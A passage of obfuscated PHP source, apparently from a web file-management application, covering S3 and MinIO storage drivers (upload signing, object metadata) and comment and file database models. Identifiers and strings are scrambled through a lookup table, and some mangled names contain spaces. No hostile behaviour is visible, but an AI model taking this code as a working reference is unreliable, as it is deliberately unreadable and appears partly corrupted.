$Œ„Ö¸•Á[$¥âºõ©[284]]; $ÖˆõŞ÷® = $this->client->listParts($this->bucket, $á¿Õ®ĞŒ, $èŒĞî¡); if (!$ÖˆõŞ÷®) { return !1; } $‚Çæ·ÃÁ = gmdate($¥âºõ©[282]); $¶óáğÖé = $¥âºõ©[290] . $èŒĞî¡; $€Ø«±¯ê = array($¥âºõ©[291], $¥âºõ©[12], $¥âºõ©[123], $¥âºõ©[12], "\x78\55\x61\x6d\x7a\x2d\x64\x61\164\x65\x3a{$‚Çæ·ÃÁ}", $¥âºõ©[8] . $this->bucket . $¥âºõ©[8] . $this->pathEncode($á¿Õ®ĞŒ) . $¶óáğÖé); $Ñ‚ü»ˆû = implode($¥âºõ©[288], $€Ø«±¯ê); $ïáÉ–Ëú = $this->client->__getSignature($Ñ‚ü»ˆû); return array($¥âºõ©[289] => $ïáÉ–Ëú, $¥âºõ©[285] => $‚Çæ·ÃÁ, $¥âºõ©[292] => $ÖˆõŞ÷®); } public function uploadPartAuthV4($¤ÇÕ“Ô, $é‘‘ğï´ = array()) { $ñÉ©õ›Â =& $_SERVER[¯‘·½]; $»ç¤é‰ = $é‘‘ğï´[$ñÉ©õ›Â[97]]; $Ñçğ¸ÍÌ = array($ñÉ©õ›Â[276] => gmdate($ñÉ©õ›Â[283]), $ñÉ©õ›Â[293] => _get($é‘‘ğï´, $ñÉ©õ›Â[294], hash($ñÉ©õ›Â[278], $ñÉ©õ›Â[12]))); $Î‰¿§êş = explode($ñÉ©õ›Â[211], $this->getHost()); $œæ†İï¤ = array($ñÉ©õ›Â[295] => $Î‰¿§êş[1], $ñÉ©õ›Â[296] => $ñÉ©õ›Â[12], $ñÉ©õ›Â[249] => $ñÉ©õ›Â[123], $ñÉ©õ›Â[297] => $é‘‘ğï´[$ñÉ©õ›Â[79]]); $‰åôşÆ = $ñÉ©õ›Â[256]; $É…Ñ˜‚Ú = $ñÉ©õ›Â[8] . $this->pathEncode($»ç¤é‰); $ıÍ÷ıä = array_intersect_key($é‘‘ğï´, array_flip(array($ñÉ©õ›Â[286], $ñÉ©õ›Â[284]))); $›ëÑ”Ë = $this->client->__getSignatureV4($Ñçğ¸ÍÌ, $œæ†İï¤, $‰åôşÆ, $É…Ñ˜‚Ú, $ıÍ÷ıä); return array($ñÉ©õ›Â[289] => $›ëÑ”Ë, $ñÉ©õ›Â[293] => $Ñçğ¸ÍÌ[$ñÉ©õ›Â[293]], $ñÉ©õ›Â[285] => $Ñçğ¸ÍÌ[$ñÉ©õ›Â[276]]); } public function uploadListAuthV4($ŞÌ˜·ı, $š‹›ï¿Ş = array()) { $äç²ö‘ö =& $_SERVER[¯‘·½]; $åÆ‡Ëˆè = $š‹›ï¿Ş[$äç²ö‘ö[97]]; $³Ôü¯ÓÚ = $š‹›ï¿Ş[$äç²ö‘ö[284]]; $àæ€»Ì = $this->client->listParts($this->bucket, $åÆ‡Ëˆè, $³Ôü¯ÓÚ); if (!$àæ€»Ì) { return !1; } $ó‚‹Àû˜ = $äç²ö‘ö[298]; foreach ($àæ€»Ì as $ÛÌö Ğ) { $ó‚‹Àû˜ .= $äç²ö‘ö[299] . "\74\120\x61\162\x74\x4e\x75\155\x62\145\x72\x3e{$ÛÌö Ğ[$äç²ö‘ö[300]]}\74\57\120\141\162\164\x4e\165\155\x62\x65\162\76\xa" . "\x3c\105\124\141\147\76{$ÛÌö Ğ[$äç²ö‘ö[301]]}\x3c\57\x45\x54\141\x67\x3e\xa" . $äç²ö‘ö[302]; } $ó‚‹Àû˜ .= $äç²ö‘ö[303]; $¸‹Ş±õ = array($äç²ö‘ö[276] => gmdate($äç²ö‘ö[283]), $äç²ö‘ö[293] => hash($äç²ö‘ö[278], $ó‚‹Àû˜)); $¬¯£ÀÂø = explode($äç²ö‘ö[211], $this->getHost()); $İı¹Ç×¡ = array($äç²ö‘ö[295] => $¬¯£ÀÂø[1], $äç²ö‘ö[249] => $äç²ö‘ö[123], $äç²ö‘ö[297] => strlen($ó‚‹Àû˜)); $‰¡¾Æéà = $äç²ö‘ö[291]; $¾–¹çÙì = $äç²ö‘ö[8] . $this->pathEncode($åÆ‡Ëˆè); $¡½’Ù”À = array($äç²ö‘ö[284] => $³Ôü¯ÓÚ); $‡°ûĞŒ‡ = $this->client->__getSignatureV4($¸‹Ş±õ, $İı¹Ç×¡, $‰¡¾Æéà, $¾–¹çÙì, $¡½’Ù”À); return array($äç²ö‘ö[289] => $‡°ûĞŒ‡, $äç²ö‘ö[293] => $¸‹Ş±õ[$äç²ö‘ö[293]], $äç²ö‘ö[285] => $¸‹Ş±õ[$äç²ö‘ö[276]], $äç²ö‘ö[292] => $àæ€»Ì); } private function _isClientAsync() { $Ñ’ò¨îª =& $_SERVER[¯‘·½]; static $¸·‰ùâ = null; if ($¸·‰ùâ === null) { $‰™ËãÓü = isset($_REQUEST[$Ñ’ò¨îª[304]]) ? json_decode($_REQUEST[$Ñ’ò¨îª[304]], !0) : !1; $¸·‰ùâ = $‰™ËãÓü && _get($‰™ËãÓü, $Ñ’ò¨îª[305]) == $Ñ’ò¨îª[306]; } return $¸·‰ùâ; } public function getHost() { $ÆÆì©¦÷ =& $_SERVER[¯‘·½]; $Î¸ÇÁßÖ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÆÆì©¦÷[70], $ÆÆì©¦÷[64], $ÆÆì©¦÷[69], $ÆÆì©¦÷[62]))) { return $Î¸ÇÁßÖ . $ÆÆì©¦÷[8] . $this->bucket; } if ($this->osType == $ÆÆì©¦÷[62] && !is_domain($Î¸ÇÁßÖ)) { return $Î¸ÇÁßÖ . $ÆÆì©¦÷[8] . $this->bucket; } $Î¸ÇÁßÖ = explode($ÆÆì©¦÷[211], $Î¸ÇÁßÖ); return $Î¸ÇÁßÖ[0] . $ÆÆì©¦÷[211] . $this->bucket . $ÆÆì©¦÷[10] . $Î¸ÇÁßÖ[1]; } public function size($ú£å†ƒ®) { $™Üãí¡ = $this->objectMeta($ú£å†ƒ®); return $™Üãí¡ ? $™Üãí¡[$_SERVER[¯‘·½][79]] : 0; } public function info($Ñ¶Ê½©ä) { if ($this->isFolder($Ñ¶Ê½©ä)) { return $this->folderInfo($Ñ¶Ê½©ä); } else { if ($this->isFile($Ñ¶Ê½©ä)) { return $this->fileInfo($Ñ¶Ê½©ä); } } return !1; } public function exist($¯ÂëÏ¨ß) { return $this->isFile($¯ÂëÏ¨ß) || $this->isFolder($¯ÂëÏ¨ß); } public function isFile($®·¸Ââ·) { return !$this->isFolder($®·¸Ââ·) && $this->objectMeta($®·¸Ââ·); } public function isFolder($Ì¼½ËŸ) { return $this->cacheMethod($_SERVER[¯‘·½][180], $Ì¼½ËŸ); } protected function objectMeta($ÅøÜÍÏŒ) { return $this->cacheMethod($_SERVER[¯‘·½][182], $ÅøÜÍÏŒ); } protected function _objectMeta($â½Í“’ï) { $˜ŒìŠß´ =& $_SERVER[¯‘·½]; $â½Í“’ï = rtrim($â½Í“’ï, $˜ŒìŠß´[8]); try { $³à© Ñ¸ = $this->client->getObjectInfo($this->bucket, $â½Í“’ï); if (!isset($³à© Ñ¸[$˜ŒìŠß´[255]]) && isset($³à© Ñ¸[$˜ŒìŠß´[307]])) { $³à© Ñ¸[$˜ŒìŠß´[255]] = $³à© Ñ¸[$˜ŒìŠß´[307]]; } } catch (Exception $îí„ØËì) { $³à© Ñ¸ = !1; } if (!$³à© Ñ¸) { } return $³à© Ñ¸; } protected function _isFolder($ø¦ğéŞ) { $’íæ¢¶á =& $_SERVER[¯‘·½]; $ø¦ğéŞ = rtrim($ø¦ğéŞ, $’íæ¢¶á[8]) . $’íæ¢¶á[8]; if ($ø¦ğéŞ == $’íæ¢¶á[12] || $ø¦ğéŞ == $’íæ¢¶á[8]) { return !0; } $ºÌÔÖœ  = $this->client->getBucket($this->bucket, $ø¦ğéŞ, null, 1); if (empty($ºÌÔÖœ [$’íæ¢¶á[239]])) { return !1; } $ÄÍàÙú = $ºÌÔÖœ [$’íæ¢¶á[239]][0][$’íæ¢¶á[32]]; return stripos($ÄÍàÙú, $ø¦ğéŞ) === 0 ? !0 : !1; if (substr($ÄÍàÙú, -1) == $’íæ¢¶á[8]) { return !0; } if (get_path_this($ÄÍàÙú) == get_path_this($ø¦ğéŞ)) { return !1; } return !0; } public function listObject($¬èàüÅ‡) { return $this->fileList($¬èàüÅ‡, $_SERVER[¯‘·½][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($«šÊˆ›Ê) { $äŞ»øÎ =& $_SERVER[¯‘·½]; parent::__construct($«šÊˆ›Ê); $this->setSignVersion($äŞ»øÎ[250]); if (!$this->region) { $this->region = $äŞ»øÎ[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $óõ’Î˜ = $this->getBktRegion(); return $this->region == $óõ’Î˜ ? !0 : !1; } public function uploadFormData($°û‹û§Õ, $á™¯è = 3600) { $ÙÃ®Ä™î =& $_SERVER[¯‘·½]; $°ä«°€İ = $ÙÃ®Ä™î[232]; $ù¼öµ¸Ó = $ÙÃ®Ä™î[260]; $şÊ¯ÆÃŒ = $ÙÃ®Ä™î[62]; $ô¥Ğ„¡¦ = gmdate($ÙÃ®Ä™î[261]); $Œ—¼¬¼€ = gmdate($ÙÃ®Ä™î[262]); $œ¤º‘ÇÖ = $ÙÃ®Ä™î[263]; $¡Şù‰ = $á™¯è . $ÙÃ®Ä™î[12]; $„™Õ³ÇŠ = $ÙÃ®Ä™î[264]; $ğî—ˆ™Ü = array($this->accessKey, $Œ—¼¬¼€, $this->region, $şÊ¯ÆÃŒ, $œ¤º‘ÇÖ); $Œúìá¢ä = implode($ÙÃ®Ä™î[8], $ğî—ˆ™Ü); $˜¸Í­Å´ = array($ÙÃ®Ä™î[265] => gmdate($ÙÃ®Ä™î[266], strtotime($ÙÃ®Ä™î[267])), $ÙÃ®Ä™î[268] => array(array($ÙÃ®Ä™î[269] => $this->bucket), array($ÙÃ®Ä™î[309] => $°ä«°€İ), array($ÙÃ®Ä™î[270], $ÙÃ®Ä™î[271], $ÙÃ®Ä™î[12]), array($ÙÃ®Ä™î[270], $ÙÃ®Ä™î[272], $ÙÃ®Ä™î[12]), array($ÙÃ®Ä™î[270], $ÙÃ®Ä™î[310], $ÙÃ®Ä™î[12]), array($ÙÃ®Ä™î[273] => $„™Õ³ÇŠ), array($ÙÃ®Ä™î[274] => $Œúìá¢ä), array($ÙÃ®Ä™î[275] => $ù¼öµ¸Ó), array($ÙÃ®Ä™î[276] => $ô¥Ğ„¡¦), array($ÙÃ®Ä™î[277] => $¡Şù‰))); $à¶çúä¨ = base64_encode(json_encode($˜¸Í­Å´)); $‰äŒÕìÁ = hash_hmac($ÙÃ®Ä™î[278], $Œ—¼¬¼€, $ÙÃ®Ä™î[279] . $this->secret, !0); $’ö³¶×„ = hash_hmac($ÙÃ®Ä™î[278], $this->region, $‰äŒÕìÁ, !0); $†Ô‚£øÈ = hash_hmac($ÙÃ®Ä™î[278], $şÊ¯ÆÃŒ, $’ö³¶×„, !0); $ˆ½äåóá = hash_hmac($ÙÃ®Ä™î[278], $œ¤º‘ÇÖ, $†Ô‚£øÈ, !0); $âîˆÂ¨€ = hash_hmac($ÙÃ®Ä™î[278], $à¶çúä¨, $ˆ½äåóá); $åõááë = array($ÙÃ®Ä™î[249] => $ÙÃ®Ä™î[12], $ÙÃ®Ä™î[297] => $ÙÃ®Ä™î[12], $ÙÃ®Ä™î[309] => $°ä«°€İ, $ÙÃ®Ä™î[273] => $„™Õ³ÇŠ, $ÙÃ®Ä™î[280] => $à¶çúä¨, $ÙÃ®Ä™î[311] => $Œúìá¢ä, $ÙÃ®Ä™î[312] => $ù¼öµ¸Ó, $ÙÃ®Ä™î[313] => $ô¥Ğ„¡¦, $ÙÃ®Ä™î[314] => $¡Şù‰, $ÙÃ®Ä™î[315] => $âîˆÂ¨€, $ÙÃ®Ä™î[209] => $this->getHost()); return $åõááë; } } goto C›ö¥‹êµ; A®‘õòö–: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\145\156\164"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\141\155\x65" => "\x63\x6f\155\x6d\x65\156\164\137\x6d\x65\164\x61", "\155\x65\164\x61\106\151\x65\154\144" => "\x63\x6f\155\155\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($çºô®¿›) { $‚µ’èá =& $_SERVER[¯‘·½]; if ($çºô®¿›[$‚µ’èá[2035]]) { $ÃÑÑÊªÇ = $this->where(array($‚µ’èá[2036] => $çºô®¿›[$‚µ’èá[2035]]))->find(); if (!$ÃÑÑÊªÇ || $ÃÑÑÊªÇ[$‚µ’èá[191]] != $çºô®¿›[$‚µ’èá[191]] || $ÃÑÑÊªÇ[$‚µ’èá[573]] != $çºô®¿›[$‚µ’èá[573]]) { return !1; } $this->where(array($‚µ’èá[2036] => $çºô®¿›[$‚µ’èá[2035]]))->setAdd($‚µ’èá[2037], 1); } $çºô®¿›[$‚µ’èá[2038]] = 0; $çºô®¿›[$‚µ’èá[2037]] = 0; $çºô®¿›[$‚µ’èá[835]] = 1; return $this->add($çºô®¿›); } public function commentCount($è²¹Ø¯Ì, $ß™²ãûş, $¢†µ˜Ì = false) { $Â ë¦é© =& $_SERVER[¯‘·½]; if (!$è²¹Ø¯Ì) { return array(); } if (is_string($è²¹Ø¯Ì) || is_int($è²¹Ø¯Ì)) { $è²¹Ø¯Ì = array($è²¹Ø¯Ì); } $¸îÜö¥º = array($Â ë¦é©[573], $Â ë¦é©[2039] => $Â ë¦é©[569]); $ÚÆ¤œÓÑ = array($Â ë¦é©[573] => array($Â ë¦é©[7], $è²¹Ø¯Ì), $Â ë¦é©[191] => $ß™²ãûş); if ($¢†µ˜Ì) { $ÚÆ¤œÓÑ[$Â ë¦é©[1806]] = $¢†µ˜Ì; } $äÙØÀ = $this->field($¸îÜö¥º)->where($ÚÆ¤œÓÑ)->group($Â ë¦é©[573])->select(); return array_to_keyvalue($äÙØÀ, $Â ë¦é©[573], $Â ë¦é©[569]); } public function starTarget($°ä¨àù, $ÆµĞÇ§) { $®Û¹±ßœ =& $_SERVER[¯‘·½]; $â™š£² = $°ä¨àù + self::TYPE_STAR_OFFSET; $ëâåÈÛÎ = array($®Û¹±ßœ[1806] => USER_ID, $®Û¹±ßœ[191] => $â™š£², $®Û¹±ßœ[573] => $ÆµĞÇ§); $÷ØÕâ‰Í = $this->where($ëâåÈÛÎ)->find(); if ($÷ØÕâ‰Í) { return $this->where(array($®Û¹±ßœ[477] => $÷ØÕâ‰Í[$®Û¹±ßœ[477]]))->delete(); } $‰ããƒ¹¸ = array($®Û¹±ßœ[2035] => 0, $®Û¹±ßœ[1806] => USER_ID, $®Û¹±ßœ[835] => 1, $®Û¹±ßœ[171] => $®Û¹±ßœ[12], $®Û¹±ßœ[191] => $â™š£², $®Û¹±ßœ[573] => $ÆµĞÇ§, $®Û¹±ßœ[2038] => 0, $®Û¹±ßœ[2037] => 0); return $this->add($‰ããƒ¹¸); } public function starTargetCount($Ñ®ÉäˆÏ, $”ú‹§›) { $Ñ³™ïêÑ =& $_SERVER[¯‘·½]; $ç´½Ø® = $”ú‹§› + self::TYPE_STAR_OFFSET; $÷­€ä = $this->commentCount($Ñ®ÉäˆÏ, $ç´½Ø®); $’”µ³Öò = $this->commentCount($Ñ®ÉäˆÏ, $ç´½Ø®, USER_ID); return array($Ñ³™ïêÑ[2040] => $÷­€ä, $Ñ³™ïêÑ[2041] => $’”µ³Öò); } public function starTargetUserList($á¹ÎìÃ¯, $å¤…·÷“) { $¡ÈÜãÙì =& $_SERVER[¯‘·½]; $µ˜Ä´şó = $á¹ÎìÃ¯ + self::TYPE_STAR_OFFSET; $Í´Ë¼®¤ = array($¡ÈÜãÙì[573] => $å¤…·÷“, $¡ÈÜãÙì[191] => $µ˜Ä´şó); $åñèŒ¤« = $this->where($Í´Ë¼®¤)->count(); $éÑ­’©À = array($¡ÈÜãÙì[335] => $åñèŒ¤«, $¡ÈÜãÙì[2042] => array()); if (!$åñèŒ¤«) { return $éÑ­’©À; } $¦·ÊíÃ = $this->field($¡ÈÜãÙì[1806])->where($Í´Ë¼®¤)->limit(500)->select(); $¦·ÊíÃ = array_to_keyvalue($¦·ÊíÃ, $¡ÈÜãÙì[12], $¡ÈÜãÙì[1806]); $éÑ­’©À[$¡ÈÜãÙì[2042]] = Model($¡ÈÜãÙì[581])->userListInfo($¦·ÊíÃ); return $éÑ­’©À; } public function prasiseUserList($äèÕÍä) { $¡®ˆ‹Ùä =& $_SERVER[¯‘·½]; $¼ˆƒè½Ä = array($¡®ˆ‹Ùä[2043] => $äèÕÍä); $‰ºÌ‘‹İ = $this->where($¼ˆƒè½Ä)->find(); $ÉŞßïœ¿ = _get($‰ºÌ‘‹İ, $¡®ˆ‹Ùä[2038], 0); $ÀÎ­‡†» = array($¡®ˆ‹Ùä[335] => $ÉŞßïœ¿, $¡®ˆ‹Ùä[2042] => array()); if (!$ÉŞßïœ¿) { return $ÀÎ­‡†»; } $¡Ÿ‘œ¤ = Model($¡®ˆ‹Ùä[2044])->field($¡®ˆ‹Ùä[1806])->where($¼ˆƒè½Ä)->limit(500)->select(); $¡Ÿ‘œ¤ = array_to_keyvalue($¡Ÿ‘œ¤, $¡®ˆ‹Ùä[12], $¡®ˆ‹Ùä[1806]); $ÀÎ­‡†»[$¡®ˆ‹Ùä[2042]] = Model($¡®ˆ‹Ùä[581])->userListInfo($¡Ÿ‘œ¤); return $ÀÎ­‡†»; } public function remove($›Á‰÷“²) { $”‰ä÷Øç =& $_SERVER[¯‘·½]; $ıûİ™Ù» = array($”‰ä÷Øç[2036] => $›Á‰÷“²); $÷ ë·Â¬ = $this->where($ıûİ™Ù»)->find(); if ($÷ ë·Â¬[$”‰ä÷Øç[2035]]) { $this->where(array($”‰ä÷Øç[2036] => $÷ ë·Â¬[$”‰ä÷Øç[2035]]))->setAdd($”‰ä÷Øç[2037], -1); } return $this->removeArray($›Á‰÷“²); } public function edit($ˆ®½šİä, $ŞåÆ›é ) { $²¿¦Üö =& $_SERVER[¯‘·½]; $È¾ú´öª = array($²¿¦Üö[2036] => $ˆ®½šİä); return $this->where($È¾ú´öª)->save(array($²¿¦Üö[2045] => $ŞåÆ›é )); } public function prasise($æí‡ì¡œ) { $˜Ìê¢ã… =& $_SERVER[¯‘·½]; $¿ˆ²º¶ = Model($˜Ìê¢ã…[2046]); $ø¦Ôâ = array($˜Ìê¢ã…[2036] => $æí‡ì¡œ, $˜Ìê¢ã…[1797] => USER_ID); $ïŒã»‚Ä = $¿ˆ²º¶->where($ø¦Ôâ)->find(); if (!$ïŒã»‚Ä) { $¿ˆ²º¶->add($ø¦Ôâ); $ä³ØÍù = $this->where(array($˜Ìê¢ã…[2036] => $æí‡ì¡œ))->setAdd($˜Ìê¢ã…[2038], 1); } else { $¿ˆ²º¶->where($ø¦Ôâ)->delete(); $ä³ØÍù = $this->where(array($˜Ìê¢ã…[2036] => $æí‡ì¡œ))->setAdd($˜Ìê¢ã…[2038], -1); } return $ä³ØÍù; } public function targetInfo($ÉŞÙ©ß”, $˜±â«‹ˆ) { $™¥ê×ï½ =& $_SERVER[¯‘·½]; $é£±Ù¤É = array($™¥ê×ï½[655] => $ÉŞÙ©ß”, $™¥ê×ï½[656] => $˜±â«‹ˆ); $©¼ì²®Ë = $this->where($é£±Ù¤É)->count(); $‘ö¸ñÓØ = "\122\x49\x47\110\x54\x20\112\x4f\111\116\x20{$this->tablePrefix}\143\x6f\155\155\145\156\164\137\x70\x72\x61\151\x73\x65\40\163\164\x61\x72\x20\157\x6e\x20\x63\x6f\155\155\145\156\164\x2e\x63\157\155\x6d\145\x6e\x74\x49\104\x20\75\40\x73\x74\141\162\56\x63\x6f\155\x6d\145\156\x74\111\x44"; $éóë˜½” = $this->alias($™¥ê×ï½[431])->where($é£±Ù¤É)->join($‘ö¸ñÓØ, $™¥ê×ï½[2047])->count(); $œºÍ‚şí = array($™¥ê×ï½[2048] => $©¼ì²®Ë, $™¥ê×ï½[2049] => $éóë˜½”); return $œºÍ‚şí; } public function listData($óß šµ÷) { $ï¬¶Ñ— =& $_SERVER[¯‘·½]; if (isset($óß šµ÷[$ï¬¶Ñ—[2050]])) { if ($óß šµ÷[$ï¬¶Ñ—[2050]]) { $óß šµ÷[$ï¬¶Ñ—[2043]] = array($ï¬¶Ñ—[1110], intval($óß šµ÷[$ï¬¶Ñ—[2050]])); } unset($óß šµ÷[$ï¬¶Ñ—[2050]]); } if (isset($óß šµ÷[$ï¬¶Ñ—[2051]])) { if ($óß šµ÷[$ï¬¶Ñ—[2051]]) { $óß šµ÷[$ï¬¶Ñ—[2043]] = array($ï¬¶Ñ—[1107], intval($óß šµ÷[$ï¬¶Ñ—[2051]])); } unset($óß šµ÷[$ï¬¶Ñ—[2051]]); } return $this->_listData($óß šµ÷); } private function _listData($Âã¢Âä÷) { $€Ã‚ÄÑ« =& $_SERVER[¯‘·½]; $ºĞÆ¾¹Ü = $this->where($Âã¢Âä÷)->_makeOrder()->selectPage(100); $this->_listAppendParent($ºĞÆ¾¹Ü[$€Ã‚ÄÑ«[447]]); $this->_listAppendUser($ºĞÆ¾¹Ü[$€Ã‚ÄÑ«[447]]); $this->_listAppendMeta($ºĞÆ¾¹Ü[$€Ã‚ÄÑ«[447]]); return $ºĞÆ¾¹Ü; } private function _makeOrder() { $ï’å×úò =& $_SERVER[¯‘·½]; $ÛÒÕ»«º = array($ï’å×úò[2038], $ï’å×úò[2037], $ï’å×úò[234]); $æöç¤š± = Input::get($ï’å×úò[532], $ï’å×úò[7], $ï’å×úò[499], $ÛÒÕ»«º); $åÈîêìÑ = Input::get($ï’å×úò[533], $ï’å×úò[7], $ï’å×úò[1799], array($ï’å×úò[2052], $ï’å×úò[528])); $Äºú½ê“ = $æöç¤š± . $ï’å×úò[53] . $åÈîêìÑ; return $this->order($Äºú½ê“); } private function _listAppendParent(&$™‘øä‚) { $ÉƒßºŞç =& $_SERVER[¯‘·½]; $»Ç®À× = array_unique(array_to_keyvalue($™‘øä‚, $ÉƒßºŞç[12], $ÉƒßºŞç[2035])); $»Ç®À× = array_remove_value($»Ç®À×, $ÉƒßºŞç[231]); if (!$»Ç®À×) { return; } $òõ›÷ı• = $this->where(array($ÉƒßºŞç[2036] => array($ÉƒßºŞç[7], $»Ç®À×)))->select(); $òõ›÷ı• = array_to_keyvalue($òõ›÷ı•, $ÉƒßºŞç[2043]); foreach ($™‘øä‚ as &$¸—¼ÓŞ) { if (isset($òõ›÷ı•[$¸—¼ÓŞ[$ÉƒßºŞç[2035]]])) { $¸—¼ÓŞ[$ÉƒßºŞç[2053]] = $òõ›÷ı•[$¸—¼ÓŞ[$ÉƒßºŞç[2035]]]; } } unset($¸—¼ÓŞ); } private function _listAppendUser(&$”†Æ²º£) { $¢ô¹âÚı =& $_SERVER[¯‘·½]; $ò¡‘Ä«ô = array_unique(array_to_keyvalue($”†Æ²º£, $¢ô¹âÚı[12], $¢ô¹âÚı[1806])); $ò¡‘Ä«ô = array_remove_value($ò¡‘Ä«ô, $¢ô¹âÚı[231]); if (count($ò¡‘Ä«ô) == 0) { return; } foreach ($”†Æ²º£ as $«ƒ•ƒ÷‘) { if (isset($«ƒ•ƒ÷‘[$¢ô¹âÚı[2053]])) { $ò¡‘Ä«ô[] = $«ƒ•ƒ÷‘[$¢ô¹âÚı[2053]][$¢ô¹âÚı[1806]]; } } $ñ¿Çú = Model($¢ô¹âÚı[601])->userListInfo($ò¡‘Ä«ô); foreach ($”†Æ²º£ as &$«ƒ•ƒ÷‘) { $«ƒ•ƒ÷‘[$¢ô¹âÚı[669]] = $ñ¿Çú[$«ƒ•ƒ÷‘[$¢ô¹âÚı[1806]]]; if (isset($«ƒ•ƒ÷‘[$¢ô¹âÚı[2053]])) { $«ƒ•ƒ÷‘[$¢ô¹âÚı[2053]][$¢ô¹âÚı[669]] = $ñ¿Çú[$«ƒ•ƒ÷‘[$¢ô¹âÚı[2053]][$¢ô¹âÚı[1806]]]; } } unset($«ƒ•ƒ÷‘); } private function _listAppendMeta(&$€—³©â­) { $õ‹ˆƒ¦ =& $_SERVER[¯‘·½]; $ôà†ŸÁô = array_unique(array_to_keyvalue($€—³©â­, $õ‹ˆƒ¦[12], $õ‹ˆƒ¦[2043])); $ôà†ŸÁô = array_remove_value($ôà†ŸÁô, $õ‹ˆƒ¦[231]); if (!$ôà†ŸÁô) { return; } foreach ($€—³©â­ as $‡ÂÃŞü») { if (isset($‡ÂÃŞü»[$õ‹ˆƒ¦[2053]])) { $ôà†ŸÁô[] = $‡ÂÃŞü»[$õ‹ˆƒ¦[2053]][$õ‹ˆƒ¦[2043]]; } } $ÂşôÕ¶º = $this->metaList($ôà†ŸÁô); if (!$ÂşôÕ¶º) { return !1; } foreach ($€—³©â­ as &$‡ÂÃŞü») { $‡ÂÃŞü»[$õ‹ˆƒ¦[543]] = $ÂşôÕ¶º[$‡ÂÃŞü»[$õ‹ˆƒ¦[2043]]]; if (isset($‡ÂÃŞü»[$õ‹ˆƒ¦[2053]])) { $‡ÂÃŞü»[$õ‹ˆƒ¦[2053]][$õ‹ˆƒ¦[543]] = $ÂşôÕ¶º[$‡ÂÃŞü»[$õ‹ˆƒ¦[2053]][$õ‹ˆƒ¦[2043]]]; } } unset($‡ÂÃŞü»); } private function metaList($ïùÄáİö) { $˜Ê±»‘ =& $_SERVER[¯‘·½]; if (!$ïùÄáİö) { return array(); } $¡ëú¦á• = array($˜Ê±»‘[2043] => array($˜Ê±»‘[7], $ïùÄáİö)); $ŸÊ¹ûÄÅ = Model($˜Ê±»‘[2054])->where($¡ëú¦á•)->select(); $ŸÊ¹ûÄÅ = array_to_keyvalue_group($ŸÊ¹ûÄÅ, $˜Ê±»‘[2043]); foreach ($ŸÊ¹ûÄÅ as $†ÏÙ¯¿û => $İ¥Ç¬û) { $Šù²Şõ¶ = array(); foreach ($İ¥Ç¬û as $±¡ê³õ†) { $Šù²Şõ¶[$±¡ê³õ†[$˜Ê±»‘[97]]] = $±¡ê³õ†[$˜Ê±»‘[452]]; } $ŸÊ¹ûÄÅ[$†ÏÙ¯¿û] = $Šù²Şõ¶; } return $ŸÊ¹ûÄÅ ? $ŸÊ¹ûÄÅ : array(); } public function removeTarget($«‡ûšİ, $êıØ‰à¢) { $˜İ…İå’ =& $_SERVER[¯‘·½]; if (!$êıØ‰à¢) { return !0; } $êıØ‰à¢ = is_array($êıØ‰à¢) ? $êıØ‰à¢ : array($êıØ‰à¢); $¤Æ¸å = array($˜İ…İå’[191] => $«‡ûšİ, $˜İ…İå’[573] => array($˜İ…İå’[7], $êıØ‰à¢)); $Ê´ï‡À¡ = $this->field($˜İ…İå’[2043])->where($¤Æ¸å)->select(); $àÇ¾õÌı = array_to_keyvalue($Ê´ï‡À¡, $˜İ…İå’[12], $˜İ…İå’[2043]); return $this->removeArray($àÇ¾õÌı); } public function removeArray($®Øœ²ğû) { $°ÑÊŸ´­ =& $_SERVER[¯‘·½]; if (!$®Øœ²ğû) { return !0; } $®Øœ²ğû = is_array($®Øœ²ğû) ? $®Øœ²ğû : array($®Øœ²ğû); $“’á§®“ = array($°ÑÊŸ´­[2043] => array($°ÑÊŸ´­[7], $®Øœ²ğû)); Model($°ÑÊŸ´­[2046])->where($“’á§®“)->delete(); Model($°ÑÊŸ´­[2055])->where($“’á§®“)->delete(); return $this->where($“’á§®“)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\145\x5f\x63\157\156\x74\x65\x6e\x74\x73"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\145\162\x74", "\146\165\156\143\164\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\x6d\x65" => "\151\x6f\x5f\146\x69\x6c\145\x5f\x6d\145\x74\x61", "\x6d\145\164\x61\x46\151\x65\x6c\x64" => "\x66\x69\154\145\111\x44"); public function fileInfo($Ì ¾Äë) { $˜–Øİù =& $_SERVER[¯‘·½]; static $¬ª·Ïú = array(); if (!isset($¬ª·Ïú[$Ì ¾Äë])) { $±¡Ïœ€° = $˜–Øİù[2056]; $Ä™¿¨Ğ¯ = Model($˜–Øİù[548])->field($±¡Ïœ€°)->where(array($˜–Øİù[546] => $Ì ¾Äë))->find(); $¬ª·Ïú[$Ì ¾Äë] = $Ä™¿¨Ğ¯; } return $¬ª·Ïú[$Ì ¾Äë]; } public function addFileByContent($Ø†¹²•ß = '', $´è–ŸÇ, $”Íªî½æ = '') { $ôÕüñİƒ =& $_SERVER[¯‘·½]; $’îí¶ò£ = TEMP_PATH . $ôÕüñİƒ[2057]; if (!is_dir($’îí¶ò£)) { mk_dir($’îí¶ò£); } $øØš¤»ç = $’îí¶ò£ . $ôÕüñİƒ[2058] . rand_string(16); $ï¦Î±Şš = file_put_contents($øØš¤»ç, $Ø†¹²•ß); if ($ï¦Î±Şš === !1 || strlen($Ø†¹²•ß) != $ï¦Î±Şš) { return !1; } $õ¸ºî‘€ = $this->addFile($øØš¤»ç, 